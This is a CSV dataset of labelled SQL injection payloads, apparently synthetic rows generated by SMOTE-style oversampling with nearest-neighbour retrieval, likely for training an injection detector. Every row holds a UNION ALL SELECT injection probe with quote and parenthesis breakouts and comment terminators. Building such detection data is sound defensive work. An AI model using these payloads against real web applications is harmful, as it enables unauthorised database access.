id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
SMOTE_000001,attack,union,"-9347'  )   union all select 3884,3884#",nearest_attack_euclidean,R000091,0.2609026816643587
SMOTE_000002,attack,union,"-2333' union all select 9714,9714,9714--",nearest_attack_euclidean,R000117,0.4859741160309627
SMOTE_000003,attack,union,-7940'  )   union all select 6024--,nearest_attack_euclidean,R000012,0.18958994133508958
SMOTE_000004,attack,union,"-5779  )   union all select 6089,6089--",nearest_attack_euclidean,R000234,0.29034627363792925
SMOTE_000005,attack,union,"1%'   )    )    union all select null,null,null#",nearest_attack_euclidean,R000129,0.12099442422752366
SMOTE_000006,attack,union,"1%""  )   union all select null,null--",nearest_attack_euclidean,R000277,0.4808178281529015
SMOTE_000007,attack,union,"-2111' union all select 1061,1061,1061--",nearest_attack_euclidean,R000099,0.3238546393721195
SMOTE_000008,attack,union,-3752%' union all select 9351--,nearest_attack_euclidean,R000199,0.7600312358747466
SMOTE_000009,attack,union,"-6368' union all select 6529,6529,6529--",nearest_attack_euclidean,R000081,0.6772424991424628
SMOTE_000010,attack,union,-9841 where 4612  =  4612 union all select 4612--,nearest_attack_euclidean,R000138,1.5371111087509244
SMOTE_000011,attack,union,-1579%'   )    )     )   union all select 7272#,nearest_attack_euclidean,R000235,0.21594900028427688
SMOTE_000012,attack,union,"-6368' union all select 6529,6529,6529--",nearest_attack_euclidean,R000081,8.429369702178807e-08
SMOTE_000013,attack,union,"-1634%' union all select 5937,5937,5937,5937--",nearest_attack_euclidean,R000226,0.23716753388842962
SMOTE_000014,attack,union,"1"" union all select null,null--",nearest_attack_euclidean,R000089,0.20527555850641246
SMOTE_000015,attack,union,-1876%'  )   union all select 6463--,nearest_attack_euclidean,R000132,0.3334154410626737
SMOTE_000016,attack,union,1'  )   union all select null--,nearest_attack_euclidean,R000062,0.04394075673864983
SMOTE_000017,attack,union,"-5691' union all select 6610,6610#",nearest_attack_euclidean,R000149,0.04825683413051337
SMOTE_000018,attack,union,-4960'  )   union all select 5300--,nearest_attack_euclidean,R000037,0.02924413266117407
SMOTE_000019,attack,union,-6109 union all select 6784--,nearest_attack_euclidean,R000153,8.429369702178807e-08
SMOTE_000020,attack,union,-7345  )   union all select 3866#,nearest_attack_euclidean,R000181,0.9409498983898321
SMOTE_000021,attack,union,"-1475""  )   union all select 8611,8611,8611#",nearest_attack_euclidean,R000094,0.5181117351747717
SMOTE_000022,attack,union,"1""  )   union all select null--",nearest_attack_euclidean,R000299,0.62296520756122
SMOTE_000023,attack,union,-7034'   )    )     )   union all select 4023#,nearest_attack_euclidean,R000122,0.01922760163723196
SMOTE_000024,attack,union,"-6368' union all select 6529,6529,6529--",nearest_attack_euclidean,R000081,0.31704580174816993
SMOTE_000025,attack,union,"-2725"" union all select 3671,3671,3671,3671,3671#",nearest_attack_euclidean,R000193,0.18682099401273586
SMOTE_000026,attack,union,"-2314%'   )    )    union all select 4612,4612--",nearest_attack_euclidean,R000018,1.2251391560676375
SMOTE_000027,attack,union,"-1337""  )   union all select 7508--",nearest_attack_euclidean,R000111,0.9580024250027989
SMOTE_000028,attack,union,"-3952'  )   union all select 6644,6644,6644--",nearest_attack_euclidean,R000237,0.7290075384786965
SMOTE_000029,attack,union,-7034'   )    )     )   union all select 4023#,nearest_attack_euclidean,R000122,0.3746474150020727
SMOTE_000030,attack,union,"1   )    )     )   union all select null,null--",nearest_attack_euclidean,R000281,0.44917859687505557
SMOTE_000031,attack,union,"-6890""   )    )     )   union all select 1115#",nearest_attack_euclidean,R000072,0.336783304467424
